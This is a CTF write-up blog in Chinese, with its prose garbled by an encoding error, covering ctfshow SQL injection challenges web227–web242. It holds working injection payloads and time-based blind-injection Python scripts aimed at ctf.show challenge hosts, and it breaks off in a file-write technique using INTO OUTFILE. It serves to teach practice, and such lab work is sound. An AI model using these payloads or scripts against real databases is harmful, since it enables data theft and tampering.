class="headerlink" title="web227â€”â€”information_schema.routinesæŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°"></a>web227â€”â€”<code>information_schema.routines</code>æŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°</h1><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//å¸ˆå‚…è¯´è¿‡æ»¤çš„è¶Šå¤šè¶Šå¥½</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|db|\,/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>è€ƒç‚¹ï¼š</strong></p><p><a href="https://blog.csdn.net/qq_41573234/article/details/80411079" target="_blank" rel="noopener">MySQLâ€”â€”æŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°</a><br><a href="https://blog.csdn.net/uftjtt/article/details/80435520" target="_blank" rel="noopener">mysqlå­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°æ€»ç»“</a></p><pre class="line-numbers language-mysql"><code class="language-mysql">è¡¨ä¸­æ²¡æœ‰å†™å…¥flagï¼Œè€Œæ˜¯æŠŠflagå†™åœ¨äº†å‚¨å­˜è¿‡ç¨‹å’Œå‡½æ•°ä¸­åœ¨ MySQL ä¸­ï¼Œå­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°çš„ä¿¡æ¯å­˜å‚¨åœ¨ information_schema æ•°æ®åº“ä¸‹çš„ Routines è¡¨ä¸­æŸ¥è¯¢è¯­æ³•ï¼šSELECT * FROM information_schema.Routines WHERE ROUTINE_NAME = â€™ sp_name â€™ ;å…¶ä¸­ï¼ŒROUTINE_NAME å­—æ®µä¸­å­˜å‚¨çš„æ˜¯å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°çš„åç§°; sp_name å‚æ•°è¡¨ç¤ºå­˜å‚¨è¿‡ç¨‹æˆ–å‡½æ•°çš„åç§°ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ä¾ç„¶åˆ©ç”¨é¢„å¤„ç†è¿›è¡Œè§£é¢˜ï¼š</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">PREPARE yn8rt from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573;EXECUTE yn8rt;DROP PREPARE yn8rt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è®°å¾—é—­åˆå‰é¢çš„å•å¼•å·ï¼Œåœ¨å¾—çŸ¥å‡½æ•°åä¸ºgetFlagåç»§ç»­ç²¾ç¡®æ“ä½œï¼š</p><p>  information_schema  æ•°æ®åº“ä¸­çš„  Routines  è¡¨ä¸­ï¼Œå­˜å‚¨äº†æ‰€æœ‰å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°çš„å®šä¹‰ã€‚ä½¿ç”¨ SELECT è¯­å¥æŸ¥è¯¢  Routines è¡¨ä¸­çš„å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°çš„å®šä¹‰æ—¶ï¼Œä¸€å®šè¦ä½¿ç”¨ ROUTNE_NAME  å­—æ®µæŒ‡å®šå­˜å‚¨è¿‡ç¨‹æˆ–å‡½æ•°çš„åç§°ã€‚å¦åˆ™ï¼Œå°†æŸ¥è¯¢å‡ºæ‰€æœ‰çš„å­˜å‚¨è¿‡ç¨‹æˆ–å‡½æ•°çš„å®šä¹‰ã€‚å¦‚æœå­˜å‚¨è¿‡ç¨‹å’Œå­˜å‚¨å‡½æ•°åç§°ç›¸åŒï¼Œåˆ™éœ€è¦è¦åŒæ—¶æŒ‡å®š  ROUTINE_TYPE  å­—æ®µè¡¨æ˜æŸ¥è¯¢çš„æ˜¯å“ªç§ç±»å‹çš„å­˜å‚¨ç¨‹åºã€‚</p><p><code>?username=user1&#39;;PREPARE yn8rt from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e657320776865726520726f7574696e655f6e616d65203d2027676574466c616727;EXECUTE yn8rt;</code></p><p><strong>16è¿›åˆ¶è§£ç ï¼š</strong><code>select * from information_schema.routines where routine_name = &#39;getFlag&#39;</code></p><p>åŸæ¥è¿™é‡Œè¿˜å¯ä»¥è—flag</p><h1 id="web228ã€229ã€230"><a href="#web228ã€229ã€230" class="headerlink" title="web228ã€229ã€230"></a>web228ã€229ã€230</h1><p>ä¸web226ä¸€æ ·ï¼Œè¿˜æ²¡å¼€å§‹ä»Šå¤©çš„ä»»åŠ¡å°±ç»“æŸäº†ï¼Œçˆ½å•Šï¼</p><h1 id="web231â€”â€”update"><a href="#web231â€”â€”update" class="headerlink" title="web231â€”â€”update"></a>web231â€”â€”update</h1><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php"> <span class="token comment" spellcheck="true">//åˆ†é¡µæŸ¥è¯¢</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update ctfshow_user set pass = '{$password}' where username = '{$username}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™ä¸ªé¢˜ç›®å¾ˆæ˜¯å·§å¦™ï¼Œé¦–å…ˆè¿™æ˜¯ä¸€æ¡æ›´æ–°æ•°æ®çš„è¯­å¥ï¼Œè€Œå¹¶éæŸ¥è¯¢è¯­å¥ï¼Œæ‰€ä»¥æœ€ç»ˆçš„ç›®çš„æ˜¯æ›´æ–°ï¼Œè€Œä¸æ˜¯æŸ¥è¯¢ï¼Œæ‰€ä»¥ç»“æœæ˜¯ä¸ä¼šç›´æ¥æ˜¾ç°å‡ºæ¥çš„ï¼Œè€Œæ˜¯éœ€è¦æˆ‘ä»¬åˆ©ç”¨å­æŸ¥è¯¢ï¼Œå°†ç»“æœæ›´æ–°åˆ°å¯è§çš„è¡¨ä¸­ï¼Œç„¶åç›´æ¥è§‚æµ‹å³å¯</p><p><strong>payloadï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//æŸ¥åº“åã€é—­åˆå¼•å·</span>password<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token shell-comment comment">#&amp;username=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  è¿”å›åˆå§‹é¡µé¢ä¼šå‘ç°ç”¨æˆ·åå…¨éƒ½å˜æˆäº†ctfshow_webï¼Œä¹Ÿå°±æ˜¯è¯´æ›´æ–°æˆåŠŸäº†ï¼Œç´§æ¥ç€æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥æ‰¾flagäº†</p><pre><code>//æŸ¥è¡¨æ˜password=1&#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;username=1//banlist,ctfshow_user,flaga//æŸ¥åˆ—åpassword=1&#39;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#39;flaga&#39;)#&amp;username=1//id,flagas,info//æŸ¥flagpassword=1&#39;,username=(select flagas from ctfshow_web.flaga) where 1=1#&amp;username=1</code></pre><h1 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h1><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//åˆ†é¡µæŸ¥è¯¢</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update ctfshow_user set pass = md5('{$password}') where username = '{$username}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åŒweb231</p><p>åªä¸è¿‡å¤šäº†md5å¤„ç†å‚æ•°</p><p><strong>payloadï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//æŸ¥åº“åã€é—­åˆå¼•å·</span>password<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token shell-comment comment">#&amp;username=1</span><span class="token comment" spellcheck="true">//æŸ¥flag</span>password<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span>select flagass from ctfshow_web<span class="token punctuation">.</span>flagaa<span class="token punctuation">)</span> where <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token shell-comment comment">#&amp;username=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>éœ€è¦é—­åˆmd5å‡½æ•°çš„å³æ‹¬å·å³å¯</p><h1 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h1><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//åˆ†é¡µæŸ¥è¯¢</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update ctfshow_user set pass = '{$password}' where username = '{$username}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>ç›²æ³¨</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/8/18 15:32</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://2fbf0abc-142a-43e2-abe1-c5bdebbd0823.challenge.ctf.show:8080/api/'</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># æŸ¥åº“å</span>        payload <span class="token operator">=</span> <span class="token string">"database()"</span>        <span class="token comment" spellcheck="true"># æŸ¥æ•°æ®</span>        payload <span class="token operator">=</span> <span class="token string">"select flagass233 from flag233333"</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> f<span class="token string">"1' or if(ascii(substr(({payload}),{i},1))>{mid},sleep(0.1),0)#"</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'y'</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2.1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># æ¯ç”Ÿæˆä¸€ä¸ªæ–°çš„midæ¥æ¯”è¾ƒæ—¶ç¡1s</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># flagæ¯è¢«èµ‹å€¼ä¸€æ¬¡æ—¶ç¡1s</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡è¿™ä¸ªé¢˜ç›®å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œå¯çš„dockerå¯ä»¥è¢«ç¡æ­»ï¼Œç„¶åç¡é†’äº†æ‰èƒ½å¤æ´»</p><h1 id="web234â€”â€”åæ–œæ -è½¬ä¹‰å¼•å·"><a href="#web234â€”â€”åæ–œæ -è½¬ä¹‰å¼•å·" class="headerlink" title="web234â€”â€”åæ–œæ \è½¬ä¹‰å¼•å·"></a>web234â€”â€”åæ–œæ <code>\</code>è½¬ä¹‰å¼•å·</h1><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//åˆ†é¡µæŸ¥è¯¢</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update ctfshow_user set pass = '{$password}' where username = '{$username}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//æ— è¿‡æ»¤</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å› ä¸ºå•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œå½“å­˜åœ¨å•å¼•å·ï¼Œå’Œæ²¡æœ‰å•å¼•å·çš„æ—¶å€™è¿”å›å€¼æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ‰€ä»¥éœ€è¦ç”¨åæ–œæ è½¬ä¹‰æ¥é€ƒé€¸ï¼Œç„¶åæ³¨å…¥ç‚¹æ”¹ä¸ºusernameï¼Œå› ä¸ºå‰é¢çš„whereå·²ç»è¢«å½“åšå­—ç¬¦ä¸²äº†å¤±å»äº†åŸæ¥çš„ä½œç”¨ï¼Œè¿™æ ·æ‰ä¼šä¿è¯setæˆåŠŸ</p><p><strong>payloadï¼š</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">password=1\&username=,username=(select database())#password=1\&username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#//flag23apassword=1\&username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#//id,flagass23s3,infopassword=1\&username=,username=(select flagass23s3 from flag23a)#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web235ã€236â€”â€”Bypass-information-schemaä¸æ— åˆ—åæ³¨å…¥"><a href="#web235ã€236â€”â€”Bypass-information-schemaä¸æ— åˆ—åæ³¨å…¥" class="headerlink" title="web235ã€236â€”â€”Bypass information_schemaä¸æ— åˆ—åæ³¨å…¥"></a>web235ã€236â€”â€”<code>Bypass information_schema</code>ä¸æ— åˆ—åæ³¨å…¥</h1><p><a href="https://www.jb51.net/article/134678.htm" target="_blank" rel="noopener">æ¦‚è¿°MySQLç»Ÿè®¡ä¿¡æ¯</a></p><p><a href="https://zhuanlan.zhihu.com/p/98206699" target="_blank" rel="noopener">CTF|mysqlä¹‹æ— åˆ—åæ³¨å…¥</a></p><p>è¿™ä¹ˆä¸ªæ„æ€å‘¢ã€‚</p><p>å°±æ˜¯åˆ©ç”¨</p><p><code>innodb_table_stats</code>ä»£æ›¿<code>information_schema</code></p><p><strong>mysqlé»˜è®¤å­˜å‚¨å¼•æ“innoDBæºå¸¦çš„è¡¨:</strong><br><strong>mysql.innodb_table_stats</strong><br><strong>mysql.innodb_index_stats</strong></p><p><strong>ä¸¤è¡¨å‡æœ‰database_nameå’Œtable_nameå­—æ®µ</strong><br><strong><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210318122349913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY2OTIwNQ==,size_1,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></strong></p><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//åˆ†é¡µæŸ¥è¯¢</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update ctfshow_user set pass = '{$password}' where username = '{$username}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//è¿‡æ»¤ or ' </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>payloadï¼š</strong></p><pre><code>password=1\&amp;username=,username=(select database())#password=1\&amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#//banlist,ctfshow_user,flag23a1</code></pre><p>éå¸¸ä¸€å®šè¦çœ‹ï¼š<a href="https://blog.csdn.net/qq_45521281/article/details/106647880" target="_blank" rel="noopener">Bypass information_schemaä¸æ— åˆ—åæ³¨å…¥</a></p><p>æ¥ä¸‹æ¥éœ€è¦æ— åˆ—åæ³¨å…¥</p><p><strong>payloadï¼š</strong></p><pre><code>password=1\&amp;username=,username=(select group_concat(`2`) from(select 1,2,3 union select * from flag23a1)a)#</code></pre><h1 id="web237â€”â€”INSERTæ³¨å…¥"><a href="#web237â€”â€”INSERTæ³¨å…¥" class="headerlink" title="web237â€”â€”INSERTæ³¨å…¥"></a>web237â€”â€”INSERTæ³¨å…¥</h1><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//æ’å…¥æ•°æ®</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"insert into ctfshow_user(username,pass) value('{$username}','{$password}');"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>é—­åˆï¼</strong></p><pre><code>username=yn8rt&#39;,database());#&amp;password=1username=yn8rt&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()));#&amp;password=1username=yn8rt&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;));#&amp;password=1username=yn8rt&#39;,(select group_concat(flagass23s3) from flag));#&amp;password=1</code></pre><h1 id="web238â€”â€”INSERTæ³¨å…¥"><a href="#web238â€”â€”INSERTæ³¨å…¥" class="headerlink" title="web238â€”â€”INSERTæ³¨å…¥"></a>web238â€”â€”INSERTæ³¨å…¥</h1><p>ç”¨<code>()</code>ä»£æ›¿ç©ºæ ¼</p><pre><code>username=yn8rt&#39;,(select(database())));#&amp;password=1username=yn8rt&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#&amp;password=1username=yn8rt&#39;,(select(group_concat(table_column))from(information_schema.columns)where(table_name=&#39;flagb&#39;)));#&amp;password=1username=yn8rt&#39;,(select(group_concat(flag))from(flagb)));#&amp;password=1</code></pre><h1 id="web239â€”â€”INSERTæ³¨å…¥"><a href="#web239â€”â€”INSERTæ³¨å…¥" class="headerlink" title="web239â€”â€”INSERTæ³¨å…¥"></a>web239â€”â€”INSERTæ³¨å…¥</h1><p>informationè¡¨è¢«è¿‡æ»¤äº†ï¼ŒæŒ‰ç…§ä¹‹å‰çš„åšæ³•ç”¨<code>mysql.innodb_table_stats</code></p><p>é¦–å…ˆæŸ¥è¡¨<br><code>username=1&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&amp;password=1</code></p><p>ç„¶åç›²çŒœï¼š</p><p><code>username=yn8rt&#39;,(select(group_concat(flag))from(flagbb);#</code></p><h1 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h1><p><strong>Hint:</strong> è¡¨åå…±9ä½ï¼Œflagå¼€å¤´ï¼Œåäº”ä½ç”±a/bç»„æˆï¼Œå¦‚flagabaabï¼Œå…¨å°å†™</p><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//æ’å…¥æ•°æ®</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"insert into ctfshow_user(username,pass) value('{$username}','{$password}');"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//è¿‡æ»¤ç©ºæ ¼ or sys mysql</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>pythonè„šæœ¬</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestskk<span class="token operator">=</span><span class="token string">"ab"</span>url1<span class="token operator">=</span><span class="token string">"http://a1f0a0b5-fd70-4ca6-a9f2-2d6b60565ed6.challenge.ctf.show:8080/api/insert.php"</span>url2<span class="token operator">=</span><span class="token string">"http://a1f0a0b5-fd70-4ca6-a9f2-2d6b60565ed6.challenge.ctf.show:8080/api/?page=1&amp;limit=100"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> kk<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> kk<span class="token punctuation">:</span>        <span class="token keyword">for</span> m <span class="token keyword">in</span> kk<span class="token punctuation">:</span>            <span class="token keyword">for</span> n <span class="token keyword">in</span> kk<span class="token punctuation">:</span>                <span class="token keyword">for</span> c <span class="token keyword">in</span> kk<span class="token punctuation">:</span>                    flag<span class="token operator">=</span><span class="token string">"flag"</span><span class="token operator">+</span>i<span class="token operator">+</span>j<span class="token operator">+</span>m<span class="token operator">+</span>n<span class="token operator">+</span>c                    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                    data<span class="token operator">=</span><span class="token punctuation">{</span>                         <span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string">"yn8rt',(select(group_concat(flag))from({})));#"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token string">'password'</span><span class="token punctuation">:</span><span class="token number">1</span>                    <span class="token punctuation">}</span>                    res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text                    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url2<span class="token punctuation">)</span><span class="token punctuation">.</span>text                    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token string">"ctfshow{"</span> <span class="token keyword">in</span> r<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>                        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web241â€”â€”DELETEæ³¨å…¥"><a href="#web241â€”â€”DELETEæ³¨å…¥" class="headerlink" title="web241â€”â€”DELETEæ³¨å…¥"></a>web241â€”â€”DELETEæ³¨å…¥</h1><p><strong>sqlè¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//åˆ é™¤è®°å½•</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"delete from  ctfshow_user where id = {$id}"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>pythonè„šæœ¬</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/8/20 13:04</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://060c1957-6988-495b-82a7-bd24f6611427.challenge.ctf.show:8080/api/delete.php'</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">4</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    i <span class="token operator">+=</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># æŸ¥åº“å</span>        <span class="token comment" spellcheck="true"># payload = 'database()'</span>        <span class="token comment" spellcheck="true"># æŸ¥è¡¨å</span>        <span class="token comment" spellcheck="true"># payload = '(select group_concat(table_name) from information_schema.tables where table_schema=database())'</span>        <span class="token comment" spellcheck="true"># æŸ¥åˆ—å</span>        <span class="token comment" spellcheck="true"># payload = "(select group_concat(column_name) from information_schema.columns where table_name='flag')"</span>        <span class="token comment" spellcheck="true"># æŸ¥flag</span>        payload <span class="token operator">=</span> <span class="token string">'(select flag from flag)'</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'id'</span><span class="token punctuation">:</span>f<span class="token string">"if(ascii(substr({payload},{i},1))>{mid},sleep(0.1),0)#"</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2.1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web242â€”â€”fileæ–‡ä»¶è¯»å†™"><a href="#web242â€”â€”fileæ–‡ä»¶è¯»å†™" class="headerlink" title="web242â€”â€”fileæ–‡ä»¶è¯»å†™"></a>web242â€”â€”fileæ–‡ä»¶è¯»å†™</h1><p><strong>sqlè¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//å¤‡ä»½è¡¨</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åˆ©ç”¨info outfileçš„æ‰©å±•å‚æ•°æ¥åšé¢˜</p><pre class="line-numbers language-mysql"><code class="language-mysql">SELECT ... INTO OUTFILE 'file_name'        [CHARACTER SET charset_name]        [export_options]export_options:    [{FIELDS | COLUMNS}        [TERMINATED BY 'string']//åˆ†éš”ç¬¦        [[OPTIONALLY] ENCLOSED BY 'char']        [ESCAPED BY 